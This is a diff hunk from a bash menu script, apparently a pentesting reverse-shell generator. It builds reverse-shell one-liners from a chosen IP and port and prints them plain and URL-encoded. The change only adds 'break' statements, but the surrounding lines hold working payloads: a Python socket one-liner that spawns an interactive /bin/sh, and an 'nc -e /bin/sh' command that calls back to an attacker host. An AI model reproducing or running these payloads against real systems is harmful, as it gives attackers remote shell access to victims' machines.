@@ -45,14 +45,16 @@ select shell in "${list_of_shells[@]}"; do
 	    python_rev_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip_addr","$ip_port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
             echo "Python_Reverse_Shell: $python_rev_shell"
 	    echo ''
-	    echo "Python_Reverse_Shell (Encoded): $(burp_urlencode "$python_rev_shell")";;
+	    echo "Python_Reverse_Shell (Encoded): $(burp_urlencode "$python_rev_shell")"
+	    break;;
 	4)
 	    echo ''
 	    #Your Netcat specific code here
 	    netcat_rev_shell="nc -e /bin/sh "$ip_addr" "$ip_port""
 	    echo "Netcat_Reverse_Shell: $netcat_rev_shell"
 	    echo ''
-	    echo "Netcat_Reverse_Shell (Encoded): $(burp_urlencode "$netcat_rev_shell")";;
+	    echo "Netcat_Reverse_Shell (Encoded): $(burp_urlencode "$netcat_rev_shell")"
+	    break;;
         *)
             echo "Invalid choice, try again."
             ;;
